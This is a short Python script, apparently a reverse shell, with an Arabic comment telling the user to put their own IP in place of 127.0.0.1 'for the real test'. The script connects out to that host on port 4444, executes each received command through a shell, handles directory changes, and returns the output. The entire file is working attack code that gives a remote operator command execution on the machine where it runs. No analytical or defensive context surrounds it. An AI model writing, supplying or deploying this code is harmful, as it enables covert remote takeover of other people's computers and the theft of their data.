import socket
import subprocess
import os

def connect():
    R_HOST = '127.0.0.1' # استبدله بـ IP جهازك عند التجربة الحقيقية
    R_PORT = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((R_HOST, R_PORT))
    while True:
        data = s.recv(1024).decode("utf-8")
        if data.lower() == "exit": break
        if data.startswith("cd "):
            try:
                os.chdir(data[3:].strip())
                s.send(b"Changed directory")
            except Exception as e:
                s.send(str(e).encode())
            continue
        obj = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = obj.stdout.read() + obj.stderr.read()
        s.send(output)
    s.close()

if __name__ == "__main__":
    connect()
